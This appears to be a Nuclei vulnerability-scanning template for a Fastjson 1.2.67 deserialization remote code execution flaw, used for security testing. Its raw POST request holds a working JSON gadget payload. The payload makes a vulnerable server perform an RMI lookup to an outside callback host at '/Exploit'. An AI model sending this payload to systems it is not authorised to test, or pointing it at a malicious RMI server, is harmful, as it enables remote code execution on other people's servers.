id: fastjson-1.2.67-rce
info:
  author: zh
  name: Fastjson 1.2.67 Deserialization RCE
  reference:
  - https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson
  - https://github.com/wyzxxz/fastjson_rce_tool
  severity: critical
  tags: fastjson,rce,deserialization,oast
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - negative: true
    status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \ \"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\"\
    ,\n   \"properties\":{\n      \"@type\":\"java.util.Properties\",\n      \"UserTransaction\"\
    :\"rmi://{{interactsh-url}}/Exploit\"\n   }\n}\n"
